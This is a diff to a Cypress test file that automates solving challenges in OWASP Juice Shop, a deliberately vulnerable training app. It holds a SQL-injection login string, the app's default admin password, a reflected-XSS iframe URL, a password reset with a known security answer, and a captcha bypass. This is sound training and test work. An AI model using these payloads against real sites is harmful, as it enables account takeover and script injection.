@@ -44,9 +44,9 @@ describe('OWASP JuiceShop Achivments unlocking Automation', () => {
 
     it('4 - Get rid of all 5-star customer feedback', () => {
       loginPage.login("' OR '1'='1'--", " ");
-      cy.intercept('GET', '/rest/products/').as('getProducts');
+      cy.intercept('GET', '/api/Feedbacks/').as('getFeedbacks');
       cy.visit('/#/administration');
-      cy.wait('@getProducts');
+      cy.wait('@getFeedbacks');
       cy.get("div[class='customer-table'] mat-row", { timeout: 10000 }).each((customerFeedback) => {
         if(customerFeedback.find("mat-icon").length === 5){
           customerFeedback.find("button").click();
@@ -79,5 +79,55 @@ describe('OWASP JuiceShop Achivments unlocking Automation', () => {
       loginPage.login(MCSafeSearchEmail, MCSafeSearchPass);
       scoreBoard.checkIsAchivSolvedXHR('Login MC SafeSearch');
     });
+
+    it('8 - Password Strength', () => {
+      const adminEmail = 'admin@juice-sh.op';
+      const adminPass = 'admin123';
+      loginPage.login(adminEmail, adminPass);
+      scoreBoard.checkIsAchivSolvedXHR('Password Strength');
+    });
+
+    it('9 - Password Strength', () => {
+      cy.request( '/.well-known/security.txt');
+      scoreBoard.checkIsAchivSolvedXHR('Security Policy');
+    });
+    
+    it("10 - Weird Crypto", () => {
+      cy.intercept('captcha/').as('captcha');
+      sideNav.navigateToCustomerFeedback();
+      cy.wait('@captcha').then((captcha) => {
+        cy.request({
+          method: 'POST',
+          url: 'http://localhost:3000/api/Feedbacks/',
+          body: {
+            captchaId: captcha.response.body.captchaId,
+            captcha: `${captcha.response.body.answer}`,
+            comment: "base64",
+            rating: 2
+          }
+        });
+      });
+      scoreBoard.checkIsAchivSolvedXHR('Weird Crypto');
+    });
+
+    it('11 - Password Strength', () => {
+      cy.request( '/.well-known/security.txt');
+      scoreBoard.checkIsAchivSolvedXHR('Security Policy');
+    });
+
+    it.skip('12 - Reflected XSS', () => {
+      //This challenge is not available on Docker!
+      cy.visit('/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E')
+      scoreBoard.checkIsAchivSolvedXHR('Reflected XSS'); 
+    });
+
+    it('13 - Visual Geo Stalking', () => {
+      const newPassword = 'newPassword123.';
+      const securityAnswer = 'ITsec';
+      const emmaEmail = 'emma@juice-sh.op';
+      resetPassword.resetPassword(emmaEmail, newPassword, securityAnswer)
+      scoreBoard.checkIsAchivSolvedXHR('Visual Geo Stalking'); 
+    });
+
   });
 });
